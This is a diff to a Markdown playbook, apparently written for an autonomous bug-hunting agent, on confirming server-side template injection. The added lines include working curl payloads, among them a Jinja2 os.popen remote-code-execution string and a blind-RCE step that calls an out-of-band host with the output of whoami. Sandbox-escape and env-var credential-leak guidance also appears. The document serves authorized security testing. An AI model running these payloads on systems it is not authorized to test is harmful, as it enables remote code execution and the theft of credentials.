@@ -138,16 +138,29 @@ Every server-rendered templated context:
 ### Step 4: Escalate within constraints
 * If sandboxed (Jinja2 SandboxedEnvironment, Twig sandbox), use class-traversal payloads to escape
 * If output is HTML-escaped, that doesn't matter — eval happens before escape
-* Length limits: chain via `{% include %}` or `{% from %}` to load externally-hosted template
+* Length limits: chain via `{% include %}` or `{% from %}` to load a template hosted on `$AUTOHUNT_OOB` (if set)
 * Filter-based blocks: `{{}}` blocked? Try `{% %}` or alternate syntax
 
-## Impact Demonstration
+## PROOF (autonomous CLI oracle)
 
-* Show arithmetic eval first (proof of SSTI without RCE)
-* Then engine identification
-* Then RCE proof: `id` / `whoami` / `hostname` output
-* If sandboxed, document the sandbox AND show file read or env-var leak as fallback proof
-* Show what you can read from the runtime: env vars (often DB creds, API keys), config object, source code
+Confirm via the firewalled Bash CLI (`curl`/`httpx`) — render a payload and grep the response for the expected output. Use a **unique arithmetic marker** (not bare `7*7`) so a coincidental `49` elsewhere on the page can't false-positive you.
+
+* **Step 1 — arithmetic eval (SSTI proof):** pick uncommon operands, submit, and confirm the *product* (not the literal expression) appears in the response:
+  ```bash
+  # expect 1343742 in the body, NOT the literal {{1361*987}}
+  curl -s "https://target/render?name=%7B%7B1361*987%7D%7D" | grep -F 1343742
+  ```
+  Body contains `1343742` = SSTI confirmed. Body contains the literal `{{1361*987}}` = not SSTI (could be XSS, see Key Considerations). Vary operands per probe to keep the marker unique.
+* **Step 2 — engine identification:** narrow with the discriminator probes (e.g. `{{7*'7'}}`→`7777777` for Jinja2) and grep the body for the expected discriminator output.
+* **Step 3 — RCE proof (command marker):** execute a benign command and confirm its output in the response. Use a **unique marker** echoed by the command so it's unambiguous:
+  ```bash
+  # Jinja2 example — expect the unique marker in the body
+  curl -s "https://target/render?name=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("{{cycler.__init__.__globals__.os.popen(\"echo SSTI_PWN_8842; id\").read()}}"))')" \
+    | grep -F SSTI_PWN_8842
+  ```
+  Marker + `uid=...` in the body = confirmed RCE. Run `id`/`whoami`/`hostname` only — no destructive commands.
+* **Blind/echo-less RCE:** if command output isn't reflected, force an OOB callback (when `$AUTOHUNT_OOB` is set): make the rendered command run `curl http://$AUTOHUNT_OOB/ssti-$(whoami)` and confirm the canary hit. **If `$AUTOHUNT_OOB` is UNSET and you can neither echo a marker nor exfil → record a LEAD, not a finding.**
+* If sandboxed and you can't reach RCE, document the sandbox AND show file read or env-var leak as fallback proof (env vars often hold DB creds/API keys; the config object and source code are also readable). A confirmed sandboxed file-read/env-leak is still a valid finding.
 
 ## Common Defenses & Bypasses
 
